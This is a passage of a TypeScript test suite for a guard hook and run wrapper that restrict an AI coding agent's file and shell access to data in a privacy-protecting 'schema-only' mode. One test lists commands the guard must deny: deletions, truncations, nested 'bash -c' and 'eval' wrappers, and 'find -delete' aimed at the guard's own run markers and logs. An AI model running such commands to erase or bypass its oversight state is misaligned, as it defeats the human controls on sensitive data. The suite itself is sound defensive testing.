    expect(runGuard(root, "Read", { file_path: path.join(root, "results", "untouched.txt") }).decision).toBe("allow")
    // Files changed within the 2 s timestamp margin before the run count as written (fail closed); wait it out
    // so untouched.txt shows that files the snapshot never saw are not all recorded.
    Bun.sleepSync(2500)
    const { code } = runSafe(root, "python3", "-c", "open('results/summary.txt', 'w').write('synthetic summary\\n')")
    expect(code).toBe(0)
    const outputs = readFileSync(path.join(root, ".methodsmith", "runs", "outputs.txt"), "utf8").split("\n")
    expect(outputs).toContain(path.join("results", "summary.txt"))
    expect(outputs).not.toContain(path.join("results", "untouched.txt"))
    const [written, untouched] = verdicts(root, [
      ["Read", { file_path: path.join(root, "results", "summary.txt") }],
      ["Read", { file_path: path.join(root, "results", "untouched.txt") }],
    ])
    expect([written.decision, untouched.decision]).toEqual(["deny", "allow"])
  }, 60000)

  test("in a project larger than the snapshot cap, a copy that preserves an old mtime is still recorded", () => {
    const root = bigProject()
    writeFileSync(path.join(root, "src", "template.txt"), "synthetic template\n")
    utimesSync(path.join(root, "src", "template.txt"), new Date("2020-01-01"), new Date("2020-01-01"))
    const { code } = runSafe(root, "python3", "-c", "import shutil; shutil.copy2('src/template.txt', 'results/summary.txt')")
    expect(code).toBe(0)
    const outputs = readFileSync(path.join(root, ".methodsmith", "runs", "outputs.txt"), "utf8").split("\n")
    expect(outputs).toContain(path.join("results", "summary.txt"))
    expect(runGuard(root, "Read", { file_path: path.join(root, "results", "summary.txt") }).decision).toBe("deny")
  }, 60000)

  test("an overwrite that keeps the same size and copies the mtime is recorded (uncapped project)", () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "results/summary.txt", "aaaa\n")
    withFile(root, "src/other.txt", "bbbb\n")
    for (const rel of ["results/summary.txt", "src/other.txt"]) {
      utimesSync(path.join(root, rel), new Date("2020-01-01"), new Date("2020-01-01"))
    }
    const { code, out } = runSafe(root, "python3", "-c", "import shutil; shutil.copy2('src/other.txt', 'results/summary.txt')")
    expect(code).toBe(0)
    expect(out).toMatch(/modified results\/summary\.txt  5 bytes/)
    const outputs = readFileSync(path.join(root, ".methodsmith", "runs", "outputs.txt"), "utf8").split("\n")
    expect(outputs).toContain(path.join("results", "summary.txt"))
    expect(outputs).not.toContain(path.join("src", "other.txt"))
  })

  test("outside a project (no .git, no .methodsmith) it refuses with exit 2 and creates nothing", () => {
    const dir = tempDir()
    const { code, out } = runSafe(dir, "python3", "-c", "open('made.txt', 'w').write('x')")
    expect(code).toBe(2)
    expect(out).toContain("no project")
    expect(existsSync(path.join(dir, ".methodsmith"))).toBe(false)
    expect(existsSync(path.join(dir, "made.txt"))).toBe(false)
    expect(existsSync(path.join(dir, ".gitignore"))).toBe(false)
  })

  test("run logs are data in schema-only mode: Read, cat, tail, and grep are denied", () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, ".methodsmith/runs/20261015T000000Z-1.log", "Zed Testperson\n")
    expectAll(root, "deny", [
      ["Read", { file_path: ".methodsmith/runs/20261015T000000Z-1.log" }],
      ["Bash", bash("cat .methodsmith/runs/20261015T000000Z-1.log")],
      ["Bash", bash("tail -n 5 .methodsmith/runs/*.log")],
      ["Grep", { pattern: "Zed", path: ".methodsmith/runs", output_mode: "content" }],
    ])
    expectAll(root, "allow", [["Bash", bash("ls .methodsmith/runs")], ["Read", { file_path: ".methodsmith/config.local.yaml" }]])
  })

  // --- per-run temp directory and in-progress run markers (R4-R6) ---
  const runsDir = (root: string) => path.join(root, ".methodsmith", "runs")
  const listFile = (file: string) => (existsSync(file) ? readFileSync(file, "utf8").split("\n").filter(Boolean) : [])
  const outputsOf = (root: string) => listFile(path.join(runsDir(root), "outputs.txt"))
  const tempRootsOf = (root: string) => listFile(path.join(runsDir(root), "temp-roots.txt"))
  const markersOf = (root: string) => {
    const dir = path.join(runsDir(root), "active")
    return existsSync(dir) ? readdirSync(dir).filter((f) => f.endsWith(".json")) : []
  }
  const markerJson = (root: string, name: string) => JSON.parse(readFileSync(path.join(runsDir(root), "active", name), "utf8"))
  // macOS reports /var/... and /private/var/... for the same directory.
  const norm = (p: string) => p.trim().replace(/^\/private(?=\/)/, "")
  const underTempRoot = (root: string, p: string) => tempRootsOf(root).some((r) => norm(p).startsWith(norm(r) + "/") || norm(p) === norm(r))
  function runStdout(root: string) {
    const log = readdirSync(runsDir(root)).filter((f) => f.endsWith(".log")).sort().at(-1)!
    const text = readFileSync(path.join(runsDir(root), log), "utf8")
    return text.slice(text.indexOf("== stdout ==\n") + 13, text.indexOf("\n== stderr =="))
  }
  const FAST_ENV = { ...process.env, METHOD_SAFE_RUN_HEARTBEAT_SECONDS: "0.2" }
  const startSafe = (cwd: string, ...cmd: string[]) =>
    Bun.spawn([safeRun, "--", ...cmd], { cwd, env: FAST_ENV, stdout: "pipe", stderr: "pipe" })
  async function waitFor(check: () => boolean, ms = 10000) {
    const end = Date.now() + ms
    while (!check()) {
      if (Date.now() > end) throw new Error("timed out waiting for the run")
      await Bun.sleep(50)
    }
  }
  const killGroup = (pgid: number) => Bun.spawnSync(["kill", "-KILL", "--", `-${pgid}`])
  const deadPid = () => {
    const proc = Bun.spawnSync(["true"])
    return proc.pid
  }

  test("a child's tempfile.mkstemp() file lies under a temp dir registered in runs/temp-roots.txt", () => {
    const root = project(SCHEMA_ONLY)
    const { code } = runSafe(root, "python3", "-c",
      "import os, tempfile\nfd, p = tempfile.mkstemp()\nos.write(fd, b'synthetic')\nos.close(fd)\nprint(p)")
    expect(code).toBe(0)
    const made = runStdout(root).trim()
    expect(made).not.toBe("")
    expect(underTempRoot(root, path.dirname(made))).toBe(true)
  })

  test.skipIf(!Bun.which("Rscript"))("Rscript tempdir() under the runner lies under a registered temp root", () => {
    const root = project(SCHEMA_ONLY)
    const { code } = runSafe(root, "Rscript", "-e", "cat(tempdir())")
    expect(code).toBe(0)
    expect(underTempRoot(root, runStdout(root))).toBe(true)
  }, 30000)

  test("the run's temp dir is owner-only (0700), set as TMPDIR/TMP/TEMP, and removed after a normal finish", () => {
    const root = project(SCHEMA_ONLY)
    const { code } = runSafe(root, "python3", "-c",
      "import os, tempfile\nd = tempfile.gettempdir()\nprint(oct(os.stat(d).st_mode & 0o777))\nprint(d)\n" +
      "print(os.environ['TMPDIR'].rstrip('/') == os.environ['TMP'].rstrip('/') == os.environ['TEMP'].rstrip('/'))")
    expect(code).toBe(0)
    const [mode, dir, same] = runStdout(root).trim().split("\n")
    expect(mode).toBe("0o700")
    expect(same).toBe("True")
    expect(path.basename(dir)).toStartWith("msr-")
    expect(tempRootsOf(root).map(norm)).toContain(norm(dir))
    expect(existsSync(dir)).toBe(false)
    expect(markersOf(root)).toEqual([])
  })

  test("a SIGTERM to the runner is forwarded to the child; its outputs are recorded and its marker removed", async () => {
    const root = withFile(project(SCHEMA_ONLY), "analysis/term.py",
      "import signal, sys, time\n" +
      "def stop(signum, frame):\n    open('results/got_term.txt', 'w').write('synthetic\\n')\n    sys.exit(0)\n" +
      "signal.signal(signal.SIGTERM, stop)\nopen('results/partial.txt', 'w').write('synthetic\\n')\ntime.sleep(60)\n")
    mkdirSync(path.join(root, "results"))
    const proc = startSafe(root, "python3", "analysis/term.py")
    await waitFor(() => existsSync(path.join(root, "results", "partial.txt")) && markersOf(root).length === 1)
    const marker = markerJson(root, markersOf(root)[0])
    expect(marker.pid).toBe(proc.pid)
    expect(typeof marker.pid_start).toBe("string")
    expect(marker.host).toBe(os.hostname())
    expect(typeof marker.start).toBe("number")
    proc.kill("SIGTERM")
    await proc.exited
    expect(existsSync(path.join(root, "results", "got_term.txt"))).toBe(true)
    expect(outputsOf(root)).toEqual(expect.arrayContaining([path.join("results", "got_term.txt"), path.join("results", "partial.txt")]))
    expect(markersOf(root)).toEqual([])
    expect(await new Response(proc.stdout).text()).not.toContain("synthetic")
  }, 30000)

  // A writer in the run's process group that waits (at most 20 s) for a release file, then writes results/late.txt.
  const WRITER = "import os, signal, sys, time\nsignal.signal(signal.SIGTERM, signal.SIG_IGN)\n" +
    "open('results/writer_ready.txt', 'w').write('synthetic\\n')\ndeadline = time.time() + 20\n" +
    "while not os.path.exists(sys.argv[1]) and time.time() < deadline:\n    time.sleep(0.05)\n" +
    "open('results/late.txt', 'w').write('synthetic\\n')\n"
  const groupAlive = (pgid: number) => Bun.spawnSync(["kill", "-0", "--", `-${pgid}`], { stderr: "ignore" }).exitCode === 0

  test("a background writer that outlives the SIGTERM keeps the marker until it exits, and its late file is recorded", async () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "analysis/writer.py", WRITER)
    withFile(root, "analysis/bg.py",
      "import subprocess, sys, time\nsubprocess.Popen([sys.executable, 'analysis/writer.py', sys.argv[1]])\ntime.sleep(60)\n")
    mkdirSync(path.join(root, "results"))
    const release = path.join(tempDir(), "release")
    const proc = startSafe(root, "python3", "analysis/bg.py", release)
    let pgid = 0
    try {
      await waitFor(() => existsSync(path.join(root, "results", "writer_ready.txt")) && markersOf(root).length === 1
        && typeof markerJson(root, markersOf(root)[0]).pgid === "number")
      pgid = markerJson(root, markersOf(root)[0]).pgid
      proc.kill("SIGTERM")
      await Bun.sleep(800)
      expect(proc.exitCode).toBeNull()
      expect(markersOf(root)).toHaveLength(1)
      writeFileSync(release, "")
      await proc.exited
      expect(outputsOf(root)).toContain(path.join("results", "late.txt"))
      expect(markersOf(root)).toEqual([])
    } finally {
      writeFileSync(release, "")
      proc.kill("SIGKILL")
      if (pgid) killGroup(pgid)
    }
  }, 30000)

  test("a child that outlives a SIGKILLed runner keeps the run heartbeating; reconcile records its late write", async () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "analysis/writer.py", WRITER)
    withFile(root, "analysis/bg.py", "import subprocess, sys\nsubprocess.Popen([sys.executable, 'analysis/writer.py', sys.argv[1]])\n")
    mkdirSync(path.join(root, "results"))
    const release = path.join(tempDir(), "release")
    const proc = startSafe(root, "python3", "analysis/bg.py", release)
    let pgid = 0
    try {
      await waitFor(() => existsSync(path.join(root, "results", "writer_ready.txt")) && markersOf(root).length === 1
        && typeof markerJson(root, markersOf(root)[0]).pgid === "number")
      pgid = markerJson(root, markersOf(root)[0]).pgid
      proc.kill("SIGKILL")
      await proc.exited
      await Bun.sleep(2600) // past the runner's last heartbeat plus the 2 s margin
      writeFileSync(release, "")
      await waitFor(() => existsSync(path.join(root, "results", "late.txt")) && !groupAlive(pgid))
      const rec = Bun.spawnSync([safeRun, "--reconcile"], { cwd: root, env: FAST_ENV })
      expect(rec.stdout.toString()).toMatch(/reconciled 1 stale run/)
      expect(outputsOf(root)).toContain(path.join("results", "late.txt"))
      expect(markersOf(root)).toEqual([])
    } finally {
      writeFileSync(release, "")
      proc.kill("SIGKILL")
      if (pgid) killGroup(pgid)
    }
  }, 30000)

  test("a marker is unique per run: a new runner that reuses an old pid leaves that pid's marker alone", () => {
    const root = project(SCHEMA_ONLY)
    const active = path.join(runsDir(root), "active")
    mkdirSync(active, { recursive: true })
    const planted = `{"pid": 1, "pid_start": "", "pgid": null, "host": "elsewhere.invalid", "start": 1}`
    const proc = Bun.spawnSync(["sh", "-c", `printf '%s' '${planted}' > .methodsmith/runs/active/$$.json; exec "$0" -- python3 -c "import os, glob; print(sorted(os.path.basename(p) for p in glob.glob('.methodsmith/runs/active/*.json')))"`, safeRun],
      { cwd: root, env: FAST_ENV })
    expect(proc.exitCode).toBe(0)
    const names = markersOf(root)
    expect(names).toHaveLength(1)
    expect(JSON.parse(readFileSync(path.join(active, names[0]), "utf8")).host).toBe("elsewhere.invalid")
    expect(runStdout(root)).toMatch(/'\d+-\d+\.json'/)
  })

  test("a marker with a malformed pgid is reconciled once its writer is gone and it stopped heartbeating", () => {
    const root = project(SCHEMA_ONLY)
    const active = path.join(runsDir(root), "active")
    mkdirSync(active, { recursive: true })
    const dead = deadPid()
    const file = path.join(active, `${dead}-1.json`)
    writeFileSync(file, `{"pid": ${dead}, "pid_start": "", "pgid": "abc", "host": ${JSON.stringify(os.hostname())}, "start": 1}`)
    const old = new Date(Date.now() - 600_000)
    utimesSync(file, old, old)
    const proc = Bun.spawnSync([safeRun, "--reconcile"], { cwd: root, env: { ...process.env, METHOD_SAFE_RUN_HEARTBEAT_SECONDS: "1" } })
    expect(proc.stdout.toString()).toMatch(/reconciled 1 stale run/)
    expect(existsSync(file)).toBe(false)
  })

  // A run whose runner and process group were SIGKILLed: the marker stays behind.
  async function crashedRun(root: string) {
    withFile(root, "analysis/slow.py", "import time\nopen('results/written.txt', 'w').write('synthetic\\n')\ntime.sleep(60)\n")
    mkdirSync(path.join(root, "results"), { recursive: true })
    const proc = startSafe(root, "python3", "analysis/slow.py")
    await waitFor(() => existsSync(path.join(root, "results", "written.txt")) && markersOf(root).length === 1
      && typeof markerJson(root, markersOf(root)[0]).pgid === "number")
    await Bun.sleep(500) // at least one heartbeat after the write
    const { pgid } = markerJson(root, markersOf(root)[0])
    proc.kill("SIGKILL")
    killGroup(pgid)
    await proc.exited
    await Bun.sleep(200)
    expect(markersOf(root)).toHaveLength(1)
  }

  test("after a SIGKILL, --reconcile records the dead run's file but not a file edited after its last heartbeat", async () => {
    const root = project(SCHEMA_ONLY)
    await crashedRun(root)
    expect(outputsOf(root)).not.toContain(path.join("results", "written.txt"))
    await Bun.sleep(2600) // past the last heartbeat plus the 2 s margin
    writeFileSync(path.join(root, "results", "later.txt"), "synthetic later\n")
    const proc = Bun.spawnSync([safeRun, "--reconcile"], { cwd: root })
    const out = proc.stdout.toString() + proc.stderr.toString()
    expect(proc.exitCode).toBe(0)
    expect(out).toMatch(/reconciled 1 stale run/)
    expect(out.trim().split("\n")).toHaveLength(1)
    expect(outputsOf(root)).toContain(path.join("results", "written.txt"))
    expect(outputsOf(root)).not.toContain(path.join("results", "later.txt"))
    expect(markersOf(root)).toEqual([])
  }, 30000)

  test("a dead run's marker is reconciled by the next run: its written file is recorded and the marker removed", async () => {
    const root = project(SCHEMA_ONLY)
    await crashedRun(root)
    const { code, out } = runSafe(root, "true")
    expect(code).toBe(0)
    expect(out).not.toMatch(/reconcil/i)
    expect(outputsOf(root)).toContain(path.join("results", "written.txt"))
    expect(markersOf(root)).toEqual([])
  }, 30000)

  test("staleness: a mismatched start time is stale; a live runner, a live group, or another host is not", async () => {
    const root = project(SCHEMA_ONLY)
    const active = path.join(runsDir(root), "active")
    mkdirSync(active, { recursive: true })
    const now = BigInt(Date.now()) * 1000000n
    const lstart = (pid: number) => Bun.spawnSync(["ps", "-o", "lstart=", "-p", String(pid)], { env: { ...process.env, LC_ALL: "C" } })
      .stdout.toString().trim().replace(/\s+/g, " ")
    const group = Bun.spawn(["python3", "-c", "import os, time\nos.setsid()\ntime.sleep(30)\n"])
    await Bun.sleep(400)
    const marker = (name: string, pid: number, pidStart: string, pgid: number, host: string) =>
      writeFileSync(path.join(active, name),
        `{"pid": ${pid}, "pid_start": ${JSON.stringify(pidStart)}, "pgid": ${pgid}, "host": ${JSON.stringify(host)}, "start": ${now}}`)
    try {
      marker("1.json", process.pid, "Thu Jan 1 00:00:00 1970", deadPid(), os.hostname()) // pid reused: stale
      marker("2.json", process.pid, lstart(process.pid), deadPid(), os.hostname()) // runner alive
      marker("3.json", deadPid(), "Thu Jan 1 00:00:00 1970", group.pid, os.hostname()) // group alive
      marker("4.json", deadPid(), "Thu Jan 1 00:00:00 1970", deadPid(), "elsewhere.invalid") // another host
      const proc = Bun.spawnSync([safeRun, "--reconcile"], { cwd: root })
      expect(proc.exitCode).toBe(0)
      expect(proc.stdout.toString()).toMatch(/reconciled 1 stale run/)
      expect(markersOf(root).sort()).toEqual(["2.json", "3.json", "4.json"])
    } finally {
      group.kill("SIGKILL")
    }
  }, 30000)

  test("two concurrent runs: both written files land in outputs.txt and both temp dirs in temp-roots.txt", async () => {
    const root = project(SCHEMA_ONLY)
    mkdirSync(path.join(root, "results"))
    const writer = (name: string) => `import tempfile, time\nopen('results/${name}.txt', 'w').write(tempfile.gettempdir())\ntime.sleep(1.5)\n`
    const a = startSafe(root, "python3", "-c", writer("a"))
    const b = startSafe(root, "python3", "-c", writer("b"))
    expect(await a.exited).toBe(0)
    expect(await b.exited).toBe(0)
    expect(outputsOf(root)).toEqual(expect.arrayContaining([path.join("results", "a.txt"), path.join("results", "b.txt")]))
    const dirs = ["a", "b"].map((n) => norm(readFileSync(path.join(root, "results", `${n}.txt`), "utf8")))
    expect(dirs[0]).not.toBe(dirs[1])
    expect(tempRootsOf(root).map(norm)).toEqual(expect.arrayContaining(dirs))
    expect(markersOf(root)).toEqual([])
  }, 30000)
})

describe("limit 1c: the guard reads method-safe-run temp roots and in-progress run markers (R4, R5)", () => {
  const runs = (root: string) => path.join(root, ".methodsmith", "runs")
  const psField = (field: string, pid: number) =>
    Bun.spawnSync(["ps", "-o", `${field}=`, "-p", String(pid)], { env: { ...process.env, LC_ALL: "C" } })
      .stdout.toString().trim().replace(/\s+/g, " ")
  const deadPid = () => Bun.spawnSync(["true"]).pid
  // The filesystem clock, read the way the runner reads it (a file's ctime), from outside the project.
  function fsNow() {
    const probe = path.join(tempDir(), "clock")
    writeFileSync(probe, "")
    return statSync(probe, { bigint: true }).ctimeNs
  }
  function marker(root: string, name: string, fields: { pid: number; pid_start: string; pgid: number | null; host: string; start: bigint }) {
    const dir = path.join(runs(root), "active")
    mkdirSync(dir, { recursive: true })
    writeFileSync(path.join(dir, name), `{"pid": ${fields.pid}, "pid_start": ${JSON.stringify(fields.pid_start)}, ` +
      `"pgid": ${fields.pgid}, "host": ${JSON.stringify(fields.host)}, "start": ${fields.start}, "tmp": "/nonexistent/msr-x"}`)
  }
  const liveMarker = (start: bigint) => ({
    pid: process.pid, pid_start: psField("lstart", process.pid), pgid: Number(psField("pgid", process.pid)), host: os.hostname(), start,
  })
  const pause = () => Bun.sleepSync(30)
  // notes/ and R/ and incoming/ exist before the run starts; results/out.txt is written after it.
  function runProject(config = SCHEMA_ONLY) {
    const root = project(config)
    for (const dir of ["results", "notes", "R", "incoming"]) mkdirSync(path.join(root, dir))
    writeFileSync(path.join(root, "notes", "before.txt"), "synthetic note\n")
    writeFileSync(path.join(root, "R", "x.R"), "x <- 1\n")
    pause()
    const start = fsNow()
    pause()
    return { root, start }
  }
  function writeAfterStart(root: string) {
    writeFileSync(path.join(root, "results", "out.txt"), "FAKE0001 synthetic row\n")
  }

  test("a file in a registered temp root is data: Read and cat deny in schema-only, allow when approved", () => {
    for (const [config, decision] of [[SCHEMA_ONLY, "deny"], [APPROVED, "allow"]] as const) {
      const root = project(config)
      const tmp = mkdtempSync(path.join(os.tmpdir(), "msr-"))
      tempRoots.push(tmp)
      writeFileSync(path.join(tmp, "rows.txt"), "FAKE0001 synthetic row\n")
      mkdirSync(runs(root), { recursive: true })
      writeFileSync(path.join(runs(root), "temp-roots.txt"), `${tmp}\n`) // as mkdtemp returns it, not realpath'd
      const viaReal = path.join(realpathSync(tmp), "rows.txt")
      expectAll(root, decision, [
        ["Read", { file_path: path.join(tmp, "rows.txt") }],
        ["Read", { file_path: viaReal }],
        ["Bash", bash(`cat ${path.join(tmp, "rows.txt")}`)],
        ["Bash", bash(`cat ${viaReal}`)],
      ])
    }
  })

  test("the pre-rename runs folder's temp-roots.txt is read too", () => {
    const root = project(SCHEMA_ONLY)
    const tmp = tempDir("msr-")
    writeFileSync(path.join(tmp, "rows.txt"), "FAKE0001 synthetic row\n")
    mkdirSync(path.join(root, ".ce-datascience", "runs"), { recursive: true }) // rebrand:keep
    writeFileSync(path.join(root, ".ce-datascience", "runs", "temp-roots.txt"), `${tmp}\n`) // rebrand:keep
    expectAll(root, "deny", [["Read", { file_path: path.join(tmp, "rows.txt") }]])
  })

  test("with a live run marker, a file changed after its start is data; one last changed before it is not", () => {
    const { root, start } = runProject()
    writeAfterStart(root)
    marker(root, `${process.pid}.json`, liveMarker(start))
    expectAll(root, "deny", [
      ["Read", { file_path: "results/out.txt" }],
      ["Bash", bash("cat results/out.txt")],
    ])
    expectAll(root, "allow", [["Read", { file_path: "notes/before.txt" }], ["Bash", bash("cat notes/before.txt")]])
    const denied = runGuard(root, "Read", { file_path: "results/out.txt" })
    expect(denied.reason).toContain("still in progress")
    expect(denied.reason).not.toContain("--reconcile")
    expect(denied.reason).not.toContain("FAKE0001")
  })

  test("during a live run, a file renamed into the project and a script edited in place are data", () => {
    const { root, start } = runProject()
    const outside = path.join(tempDir(), "r.txt")
    writeFileSync(outside, "FAKE0001 synthetic row\n")
    utimesSync(outside, new Date(2020, 0, 1), new Date(2020, 0, 1)) // an old mtime survives the rename
    marker(root, `${process.pid}.json`, liveMarker(start))
    renameSync(outside, path.join(root, "incoming", "r.txt"))
    writeFileSync(path.join(root, "R", "x.R"), "x <- 2\n")
    expectAll(root, "deny", [
      ["Read", { file_path: "incoming/r.txt" }],
      ["Read", { file_path: "R/x.R" }],
      ["Bash", bash("cat R/x.R")],
    ])
  })

  test("a stale marker denies and names --reconcile; another host's marker denies without offering it", () => {
    const stale = runProject()
    writeAfterStart(stale.root)
    marker(stale.root, "123.json", { pid: deadPid(), pid_start: "", pgid: deadPid(), host: os.hostname(), start: stale.start })
    const staleDeny = runGuard(stale.root, "Read", { file_path: "results/out.txt" })
    expect(staleDeny.decision).toBe("deny")
    expect(staleDeny.reason).toContain("method-safe-run --reconcile")

    const foreign = runProject()
    writeAfterStart(foreign.root)
    marker(foreign.root, "123.json", { pid: deadPid(), pid_start: "", pgid: deadPid(), host: "elsewhere", start: foreign.start })
    const foreignDeny = runGuard(foreign.root, "Read", { file_path: "results/out.txt" })
    expect(foreignDeny.decision).toBe("deny")
    expect(foreignDeny.reason).toContain("another host")
    expect(foreignDeny.reason).not.toContain("--reconcile")
    expectAll(foreign.root, "allow", [["Read", { file_path: "notes/before.txt" }]])
  })

  test("an unreadable marker counts as an active run starting when the marker was created (fail closed)", () => {
    const { root } = runProject()
    const old = new Date(Date.now() - 3600_000)
    utimesSync(path.join(root, "notes", "before.txt"), old, old) // also sets its ctime to now
    mkdirSync(path.join(runs(root), "active"), { recursive: true })
    pause() // coarse filesystem clocks (Linux): keep that ctime strictly before the marker's creation
    writeFileSync(path.join(runs(root), "active", "77.json"), "{not json")
    writeFileSync(path.join(runs(root), "active", ".77.json.tmp"), "{not json") // half-written, ignored by name
    withFile(root, "results/after.csv", "group,n\na,120\n")
    expectAll(root, "deny", [["Read", { file_path: "results/after.csv" }]])
    expectAll(root, "allow", [["Read", { file_path: "notes/before.txt" }]])
  })

  test("--reconcile clears an unreadable marker once its writer is gone and it stopped heartbeating", () => {
    const { root } = runProject()
    const marker = path.join(runs(root), "active", "999999.json")
    mkdirSync(path.dirname(marker), { recursive: true })
    writeFileSync(marker, "{not json")
    const old = new Date(Date.now() - 600_000)
    utimesSync(marker, old, old)
    const proc = Bun.spawnSync([safeRun, "--reconcile"], { cwd: root, env: { ...process.env, METHOD_SAFE_RUN_HEARTBEAT_SECONDS: "1" } })
    expect(proc.exitCode).toBe(0)
    expect(existsSync(marker)).toBe(false)
  })

  test("in an approved project a marker changes nothing", () => {
    const { root, start } = runProject(APPROVED)
    writeAfterStart(root)
    marker(root, `${process.pid}.json`, liveMarker(start))
    expectAll(root, "allow", [["Read", { file_path: "results/out.txt" }], ["Bash", bash("cat results/out.txt")]])
  })

  test("schema-only commands and edits cannot remove, move, truncate, or write the boundary state", () => {
    const root = project(SCHEMA_ONLY)
    mkdirSync(path.join(runs(root), "active"), { recursive: true })
    writeFileSync(path.join(runs(root), "temp-roots.txt"), "/nonexistent/msr-x\n")
    marker(root, "123.json", { pid: deadPid(), pid_start: "", pgid: null, host: "elsewhere", start: 10n ** 19n }) // starts later than any file here
    const deny: Array<[string, Record<string, unknown>]> = [
      ["Bash", bash("rm .methodsmith/runs/active/123.json")],
      ["Bash", bash(`${safeRun} -- rm .methodsmith/runs/active/123.json`)],
      ["Bash", bash("rm -f .methodsmith/runs/active/*.json")],
      ["Bash", bash("rm -rf .methodsmith/runs")],
      ["Bash", bash("unlink .methodsmith/runs/active/123.json")],
      ["Bash", bash("mv .methodsmith/runs/active/123.json /tmp/")],
      ["Bash", bash("cp /dev/null .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash("echo > .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash(": > .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash("echo x >> .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash("echo x | tee .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash("sed -i '' -e d .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash("truncate -s 0 .methodsmith/runs/temp-roots.txt")],
      ["Bash", bash("rm .methodsmith/runs/outputs.txt")],
      ["Bash", bash(": > .methodsmith/runs/outputs.txt")],
      ["Bash", bash("find .methodsmith/runs -name outputs.txt -delete")],
      ["Write", { file_path: ".methodsmith/runs/outputs.txt", content: "" }],
      ["Bash", bash("touch .methodsmith/runs/active/123.json")],
      ["Bash", bash("find .methodsmith/runs/active -name '*.json' -delete")],
      ["Bash", bash("find . -type f -exec rm {} +")],
      ["Bash", bash("cd .methodsmith/runs && rm temp-roots.txt")],
      ["Bash", bash("bash -c 'rm .methodsmith/runs/active/123.json'")],
      ["Bash", bash(`${safeRun} -- bash -c 'rm .methodsmith/runs/active/123.json'`)],
      ["Bash", bash(`${safeRun} -- sh -c 'cat notes.txt; echo x > .methodsmith/runs/temp-roots.txt'`)],
      ["Bash", bash(`${safeRun} -- bash -c "eval 'rm -f .methodsmith/runs/active/*.json'"`)],
      ["Monitor", bash("rm .methodsmith/runs/active/123.json")],
      ["Write", { file_path: ".methodsmith/runs/temp-roots.txt", content: "" }],
      ["Write", { file_path: ".methodsmith/runs/active/9.json", content: "{}" }],
      ["Edit", { file_path: ".methodsmith/runs/temp-roots.txt", old_string: "x", new_string: "" }],
    ]
    expectAll(root, "deny", deny)
    expectAll(root, "allow", [
      ["Bash", bash("ls .methodsmith/runs/active")],
      ["Bash", bash(`${safeRun} --reconcile`)],
      ["Bash", bash("rm -f notes.txt")],
      ["Bash", bash("rm -f .methodsmith/runs/*.log")],
      ["Bash", bash("find . -name '*.pyc' -delete")],
      ["Bash", bash("cp src/load.py src/load_copy.py")],
      ["Write", { file_path: "analysis/new.py", content: "print(1)\n" }],
    ])
    const reason = runGuard(root, "Bash", bash("rm .methodsmith/runs/active/123.json")).reason
    expect(reason).toContain("method-safe-run")
    const approved = project(APPROVED)
    expectAll(approved, "allow", [["Bash", bash("rm .methodsmith/runs/active/123.json")],
      ["Write", { file_path: ".methodsmith/runs/temp-roots.txt", content: "" }]])
  })

  test("with 20 run markers present a guard decision stays under 1 s (R9)", () => {
    const { root, start } = runProject()
    writeAfterStart(root)
    const live = liveMarker(start)
    for (let i = 0; i < 20; i++) {
      marker(root, `${1000 + i}.json`, i % 2 ? live : { pid: deadPid(), pid_start: "", pgid: deadPid(), host: os.hostname(), start })
    }
    const t0 = performance.now()
    const result = runGuard(root, "Read", { file_path: "results/out.txt" })
    const elapsed = performance.now() - t0
    expect(result.decision).toBe("deny")
    expect(elapsed).toBeLessThan(1000)
    const t1 = performance.now()
    expect(runGuard(root, "Bash", bash("cat notes/before.txt results/out.txt R/x.R src/load.py")).decision).toBe("deny")
    expect(performance.now() - t1).toBeLessThan(1000)
  })
})

describe("limit 2a: method-identifier-index stores salted hashes of identifier values", () => {
  test("indexes identifier columns under data_root, prints counts only, stores no plaintext, and is gitignored", () => {
    const root = project(SCHEMA_ONLY, { git: "real" })
    withFile(root, "data/claims.tsv", "claim_number\tmember_id\tdx_code\tfirst_name\tlast_name\nCLM-55501\tMBR-0099\tA41.9\tQuinn\tSamplewright\n")
    const { code, out } = buildIndex(root)
    expect(code).toBe(0)
    expect(out).toMatch(/2 files, 7 identifier columns, \d+ entries/)
    for (const value of ["patient_name", "Zed", "Testperson", "FAKE0001", "1970", "Quinn", "CLM-55501"]) {
      expect({ value, printed: out.includes(value) }).toEqual({ value, printed: false })
    }
    const index = JSON.parse(readFileSync(indexPath(root), "utf8"))
    expect(index.hashes).toMatch(/^[0-9a-f]+$/)
    const raw = JSON.stringify({ ...index, hashes: undefined })
    expect(index.salt).toMatch(/^[0-9a-f]{32}$/)
    expect(index.count).toBeGreaterThan(5)
    for (const value of ["zed", "testperson", "fake0001", "1970", "quinn", "samplewright", "55501", "mbr"]) {
      expect({ value, stored: raw.toLowerCase().includes(value) }).toEqual({ value, stored: false })
    }
    expect(Bun.spawnSync(["git", "check-ignore", "-q", ".methodsmith/identifier-index.local.json"], { cwd: root }).exitCode).toBe(0)
    const again = JSON.parse((buildIndex(root), readFileSync(indexPath(root), "utf8")))
    expect(again.salt).not.toBe(index.salt)
  })
})

// Queries that must keep working with an index present: topics, author surnames, PMIDs, DOIs.
const NORMAL_QUERIES: Array<[string, Record<string, unknown>]> = [
  ["mcp__pubmed-mcp-server__pubmed_search_articles", { query: "sepsis bundle mortality cohort", author: "Hernan MA" }],
  ["mcp__pubmed-mcp-server__pubmed_search_articles", { query: "target trial emulation Hernan Robins" }],
  ["mcp__pubmed-mcp-server__pubmed_search_articles", { query: "Testperson syndrome case series" }],
  ["mcp__pubmed-mcp-server__pubmed_fetch_articles", { pmids: ["31978945", "32109013"] }],
  ["mcp__pubmed-mcp-server__pubmed_convert_ids", { ids: ["10.1056/NEJMoa2034577", "PMC7092803"] }],
  ["mcp__paperclip__lookup", { doi: "10.1001/jama.2023.12345" }],
  ["mcp__paperclip__search", { query: "Zed regression in ICU outcomes 1970 to 2020" }],
]

describe("limit 2b: identifier index checks on MCP arguments (every mode)", () => {
  test("a synthetic patient's full name or ID is denied; normal queries pass; the reason never echoes the match", () => {
    for (const config of [SCHEMA_ONLY, APPROVED]) {
      const root = project(config)
